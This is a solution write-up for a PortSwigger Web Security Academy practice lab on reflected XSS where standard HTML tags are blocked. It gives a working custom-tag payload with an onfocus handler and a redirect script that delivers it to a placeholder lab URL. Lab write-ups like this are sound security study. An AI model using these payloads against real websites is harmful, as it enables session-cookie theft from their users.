# Reflected XSS with All Standard Tags Blocked Lab

This project documents a PortSwigger Web Security Academy lab demonstrating a reflected Cross-Site Scripting (XSS) vulnerability where all standard HTML tags are blocked, but custom HTML elements are still allowed.

## Lab Information

- **Vulnerability:** Reflected Cross-Site Scripting (XSS)
- **Context:** HTML
- **Difficulty:** Practitioner
- **Status:** Solved
- **Target Function:** Search functionality
- **Protection:** Standard HTML tags blocked
- **Target Function:** `alert(document.cookie)`

## Solution

1. Use the exploit server to deliver a URL containing a custom HTML tag.
2. The custom tag uses an `onfocus` event handler to execute JavaScript.
3. The `tabindex` attribute makes the custom element focusable.
4. The `#x` fragment causes the browser to focus the element automatically when the page loads.
5. The `onfocus` event then executes `alert(document.cookie)` without requiring user interaction.

## Payload Used

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```
Exploitation Payload
```JS
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
